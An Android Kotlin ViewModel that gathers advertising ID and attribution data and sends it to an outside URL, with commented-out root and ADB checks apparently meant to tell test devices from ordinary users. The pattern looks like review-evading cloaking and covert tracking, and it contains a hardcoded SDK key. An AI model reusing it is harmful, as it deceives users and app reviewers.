package com.nekki.shadowfi.ui

import android.content.Context
import android.net.Uri
import android.provider.Settings
import android.util.Log
import androidx.core.net.toUri
import androidx.lifecycle.ViewModel
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.withContext
import java.io.File
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

/**
 * Created by Android Studio on 20.02.2022 21:40
 *
 * @author Vlad Makarenko
 */

private const val URL_VALUE = "https://trident.website/nVmCWmt8"

class SomeViewModel(private val context: Context) : ViewModel() {

    private val isPlainUser = flow {
        emit(true)
//        emit(checks() || tracks() == "1")
    }

    val result = isPlainUser.flatMapLatest {
        if (it) {
            url.map {
                Pair(true, it)
            }
        } else {
            flowOf(Pair(false, null))
        }
    }

    private fun checks(): Boolean {
        val places = arrayOf(
            "/sbin/", "/system/bin/", "/system/xbin/",
            "/data/local/xbin/", "/data/local/bin/",
            "/system/sd/xbin/", "/system/bin/failsafe/",
            "/data/local/"
        )
        try {
            for (where in places) {
                if (File(where + "su").exists()) return true
            }
        } catch (ignore: Throwable) {
        }
        return false
    }

    private fun tracks(): String {

        return Settings.Global.getString(context.contentResolver, Settings.Global.ADB_ENABLED)
            ?: "null"
    }

    private val appsFlyer =
        MutableStateFlow<DataWrapper<MutableMap<String, Any>?>>(DataWrapper.Starting)
    private var facebookData = MutableStateFlow<DataWrapper<String?>>(DataWrapper.Starting)

    init {
        val listener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                appsFlyer.tryEmit(DataWrapper.Data(p0))
            }

            override fun onConversionDataFail(p0: String?) {
            }

            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            }

            override fun onAttributionFailure(p0: String?) {
            }
        }

        AppsFlyerLib.getInstance().init("kN6t4Ac4r8UHn6TD7Z9WyN", listener, context)
        AppsFlyerLib.getInstance().start(context)

        AppLinkData.fetchDeferredAppLinkData(context) { data ->
            facebookData.tryEmit(DataWrapper.Data(data?.targetUri.toString()))
        }
    }

    private val data = appsFlyer.combine(facebookData) { it1, it2 ->
        Log.e("AppsFlyer", "${(it1 as? DataWrapper.Data)?.value}")
        Log.e("Deeplink", "${(it2 as? DataWrapper.Data)?.value}")
        Pair(it1, it2)
    }

    private val urlFromLocal = flow {
        emit(context.getSharedPreferences("MyPref", Context.MODE_PRIVATE).getString("links", null))
    }

    private val urlFromRemote =
        data.filter { Log.e("URL", "FIRST: ${it.first}; SECOND: ${it.second}"); it.first is DataWrapper.Data && it.second is DataWrapper.Data }.map {
            Log.e("URL", "1")
            val appsFlyerMap = (it.first as DataWrapper.Data).value
            val tempDeepLink = (it.second as DataWrapper.Data).value
            val deepLink = tempDeepLink?.replace("myapp://", "")
            val tempCompaign = appsFlyerMap?.get("campaign")
            val compaign = tempCompaign.toString().replace("||", "&")
                .replace("_", "=")

            if (tempCompaign == "null" && deepLink.toString() == "null") {
                OneSignal.sendTag("key2", "organic")
            } else if (tempCompaign != "null") {
                OneSignal.sendTag(
                    "key2",
                    tempCompaign.toString().substringAfter("sub1_").substringBefore("||sub2")
                )
            } else if (deepLink.toString() != "null") {
                OneSignal.sendTag(
                    "key2",
                    tempDeepLink.toString().substringAfter("sub1_").substringBefore("||sub2")
                )
            }

            Log.e("URL", "2")
            val url = URL_VALUE.toUri().buildUpon().apply {
                appendQueryParameter("gadid", withContext(Dispatchers.IO) { getAdvId() })
                appendQueryParameter(
                    "af_id",
                    AppsFlyerLib.getInstance().getAppsFlyerUID(context)
                )
                appendQueryParameter("orig_cost", appsFlyerMap?.get("orig_cost").toString())
                appendQueryParameter("adset_id", appsFlyerMap?.get("adset_id").toString())
                appendQueryParameter("campaign_id", appsFlyerMap?.get("campaign_id").toString())
                appendQueryParameter("source", appsFlyerMap?.get("media_source").toString())
                appendQueryParameter("bundle", context.packageName)
                appendQueryParameter("af_siteid", appsFlyerMap?.get("af_siteid").toString())
                appendQueryParameter("currency", appsFlyerMap?.get("currency").toString())
                appendQueryParameter("adset", encode(appsFlyerMap?.get("adset").toString()))
                appendQueryParameter("adgroup", encode(appsFlyerMap?.get("adgroup").toString()))
                if (deepLink != "null" && deepLink.toString().contains("sub")) {
                    appendQueryParameter(
                        "app_campaign",
                        encode(deepLink.toString().replace("||", "&").replace("_", "="))
                    )
                } else {
                    val c = appsFlyerMap?.get("c")?.toString()
                    if (c != "null" && c.toString().contains("sub")) {
                        appendQueryParameter(
                            "app_campaign",
                            encode(c.toString().replace("||", "&").replace("_", "="))
                        )
                    } else {
                        appendQueryParameter(
                            "app_campaign",
                            encode(
                                compaign
                            )
                        )
                    }
                }
                Log.e("URL", "3")
            }.build()
            Log.e("URL", "4")
            Log.e("URL", url.toString())
            url.toString()
        }

    private val url = urlFromLocal.flatMapLatest {
        Log.e("FLOW", "LOCAL:$it")
        if (it.isNullOrBlank()) {
            urlFromRemote.onEach {
                Log.e("FLOW", "REMOTE:$it")
            }
        } else {
            flowOf(it)
        }
    }

    private suspend fun getAdvId(): String = suspendCoroutine {
        val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context)
        val gadid = adInfo.id.toString()
        OneSignal.setExternalUserId(gadid)
        it.resume(gadid)
    }

    private fun encode(string: String) = Uri.encode(string)

    sealed interface DataWrapper<out T> {
        object Starting : DataWrapper<Nothing>
        data class Data<T>(val value: T) : DataWrapper<T>
    }
}